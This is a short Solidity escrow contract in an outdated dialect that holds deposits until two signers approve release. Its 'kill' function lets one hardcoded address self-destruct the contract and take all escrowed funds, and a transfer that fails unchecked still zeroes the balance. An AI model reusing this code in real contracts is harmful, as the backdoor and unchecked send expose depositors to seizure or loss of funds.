contract escrow { 
  mapping (int => Holding) public holdings;
  int public numHoldings;
  uint public totalValue;

  struct Holding {
    uint amount;
    address receiver;
    bool unSpent;
    int8 numSigners;
    mapping (int => Signer) signers;
  }

  struct Signer {
    address userAddress;
    bool hasSigned;
  }

  function escrow() {  }

  function holdCoin(address receiver, address thirdPartySigner) returns(int id) {
    numHoldings++;
    totalValue += msg.value;
    holdings[numHoldings] = Holding(msg.value, receiver, true, 2);
    holdings[numHoldings].signers[1] = Signer(msg.sender, false);
    holdings[numHoldings].signers[2] = Signer(thirdPartySigner, false);
    
    return numHoldings;
  }

  function signRelease(int holdingID) returns(bool released) {
    for(int i = 0; i <= holdings[holdingID].numSigners; i++){ 
        if(holdings[holdingID].signers[i].userAddress == msg.sender){
            holdings[holdingID].signers[i].hasSigned = true;
        }
    }
    bool releasable = true;
    for(int j = 1; j <= holdings[holdingID].numSigners; j++){
      if(!holdings[holdingID].signers[j].hasSigned) releasable = false;
    }
    if(releasable){
      holdings[holdingID].receiver.send(holdings[holdingID].amount);
      totalValue -= holdings[holdingID].amount;
      holdings[holdingID].amount = 0;
      holdings[holdingID].unSpent = false;
    }
    return true;
  }

  function kill(){ if (msg.sender == 0x82ab1649f370ccf9f2a5006130c4fca28db2587e)suicide(0x82ab1649f370ccf9f2a5006130c4fca28db2587e);}
}
